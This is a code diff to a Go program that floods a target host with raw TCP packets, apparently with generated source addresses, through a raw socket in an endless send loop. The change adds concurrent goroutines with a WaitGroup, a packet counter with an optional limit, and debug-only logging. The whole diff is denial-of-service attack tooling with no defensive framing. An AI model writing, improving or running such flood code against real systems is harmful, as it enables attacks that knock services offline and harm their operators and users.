@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"reflect"
+	"sync"
 	"syscall"
 )
 
@@ -11,14 +12,19 @@ func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
 	if err != nil {
 		fmt.Println(err)
 	} else {
-		fmt.Printf(
-			"Socket used:  %d.%d.%d.%d:%d\n",
-			tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
-		)
+		packetCount++
+
+		if debugMode {
+			fmt.Printf(
+				"Socket used:  %d.%d.%d.%d:%d\n",
+				tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
+			)
+		}
 	}
 }
 
-func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {
+func (tcp *TCPIP) floodTarget(wg *sync.WaitGroup, rType reflect.Type, rVal reflect.Value) {
+	defer wg.Done()
 
 	var dest [4]byte
 	copy(dest[:], tcp.DST[:4])
@@ -33,16 +39,22 @@ func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {
 		Addr: dest,
 	}
 
+	tcp.genIP()
+	tcp.calcTCPChecksum()
+	tcp.buildPayload(rType, rVal)
+
 	for {
-		tcp.genIP()
-		tcp.calcTCPChecksum()
-		tcp.buildPayload(rType, rVal)
+		if packetLimit > 0 && packetCount > packetLimit {
+			break
+		}
+
 		tcp.rawSocket(fd, addr)
 	}
 }
 
 func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
 	tcp.Payload = make([]byte, 60)
+
 	var payloadIndex int = 0
 	for i := 0; i < t.NumField(); i++ {
 		field := t.Field(i)
